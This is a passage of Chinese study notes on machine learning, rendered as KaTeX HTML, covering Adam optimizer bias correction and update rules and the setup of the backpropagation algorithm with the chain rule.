mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5769599999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mover accent="true"><mi>v</mi><mo>^</mo></mover><mi>t</mi></msub><mo>=</mo><mfrac><msub><mi>v</mi><mi>t</mi></msub><mrow><mn>1</mn><mo>−</mo><msubsup><mi>β</mi><mn>2</mn><mi>t</mi></msubsup></mrow></mfrac></mrow><annotation encoding="application/x-tex">\hat{v}_t=\frac{v_t}{1-\beta_2^t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.22222em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.288452em;vertical-align:-0.5769599999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7114919999999999em;"><span style="top:-2.6411000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7841428571428571em;"><span style="top:-2.188485714285714em;margin-left:-0.05278em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span><span style="top:-2.8448em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.31151428571428574em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.4101em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5769599999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p></li><li><p>参数 𝛽1、 𝛽2 ∈ [0, 1) 控制了这些移动均值（moving average）指数衰减率。</p></li><li><p>更新规则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>θ</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><mi>θ</mi><mi>t</mi><mo>−</mo><mfrac><mi>η</mi><mrow><msqrt><msub><mover accent="true"><mi>v</mi><mo>^</mo></mover><mi>t</mi></msub></msqrt><mo>+</mo><mi>ε</mi></mrow></mfrac><msub><mover accent="true"><mi>m</mi><mo>^</mo></mover><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">\theta_{t+1}=\theta{t}-\frac{\eta}{\sqrt{\hat{v}_t}+\varepsilon}\hat{m}_t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord"><span class="mord mathdefault">t</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2854999999999999em;vertical-align:-0.5379999999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.5835585em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.866345em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mtight"><span class="mord accent mtight"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span class="accent-body" style="left:-0.22222em;"><span class="mtight">^</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.29634285714285713em;"><span style="top:-2.357em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.826345em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.173655em;"><span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">ε</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">η</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5379999999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">m</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;">^</span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p></li><li><p>Adam 的核心在于用指数滑动平均去估计梯度每个分量的一阶矩(动量)和二阶矩(用于自适应学习率)，并用二阶矩去归一化一阶矩，得到每一步的更新量。通常而言， Adam是自适应学习率算法的较优选择</p></li></ul><h1 id="误差逆传播算法bp神经网络"><a class="markdownIt-Anchor" href="#误差逆传播算法bp神经网络"></a> 误差逆传播算法——BP神经网络</h1><ul><li>误差逆传播（error BackPropagation，简称BP）它是迄今为止最成功的神经网络学习算法，现实任务中使用神经网络时，大多在使用BP算法进行训练多层前馈神经网络，还可用于训练例如递归神经网络。</li></ul><h2 id="链式法则"><a class="markdownIt-Anchor" href="#链式法则"></a> 链式法则</h2><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=g(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>z</mi><mo>=</mo><mi>h</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">z=h(y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>，$$\nabla{x}→\nabla{y}→\nabla{z} , \frac{dz}{dx}=\frac{dz}{dy}\frac{dy}{dx}$$</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>=</mo><mi>g</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x=g(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mi>h</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=h(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>z</mi><mo>=</mo><mi>k</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">z=k(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span>，$$\nabla{s}→\nabla{x},\nabla{y}→\nabla{z} , \frac{dz}{ds}=\frac{dz}{dx}\frac{dx}{ds}+\frac{dz}{dy}\frac{dy}{ds}$$</li></ul><h2 id="bp算法过程"><a class="markdownIt-Anchor" href="#bp算法过程"></a> BP算法过程</h2><ul><li>给定训练集：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>m</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>m</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>x</mi><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mi>d</mi></msup><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><msup><mi mathvariant="double-struck">R</mi><mi>l</mi></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">D=((x_1,y_1),(x_2,y_2)....(x_m,y_m)),x∈\Bbb{R}^d,y∈\Bbb{R}^l,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathbb">R</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathbb">R</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></li><li>输入：d维特征向量，（d个属性）；</li><li>输出：L个输出值（l维实值向量）；</li><li>隐层：假定使用q个隐层神经元；</li><li>输出层权重：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">w_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>；隐层权重：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>v</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">v_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>；输出层阈值：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>θ</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">θ_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>；隐层阈值：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>γ</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">γ_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>隐层输入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mi>h</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>d</mi></msubsup><mrow><msub><mi>w</mi><mrow><mi>h</mi><mi>j</mi></mrow></msub><msub><mi>x</mi><mi>i</mi></msub></mrow></mrow><annotation encoding="application/x-tex">a_h=\sum^{d}_{i=1}{w_{hj}x_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2887179999999998em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></li><li>输出层输入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>β</mi><mi>j</mi></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>h</mi><mo>=</mo><mn>1</mn></mrow><mi>q</mi></msubsup><mrow><msub><mi>w</mi><mrow><mi>h</mi><mi>j</mi></mrow></msub><msub><mi>b</mi><mi>h</mi></msub></mrow></mrow><annotation encoding="application/x-tex">\beta_j=\sum^{q}_{h=1}{w_{hj}b_h}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span 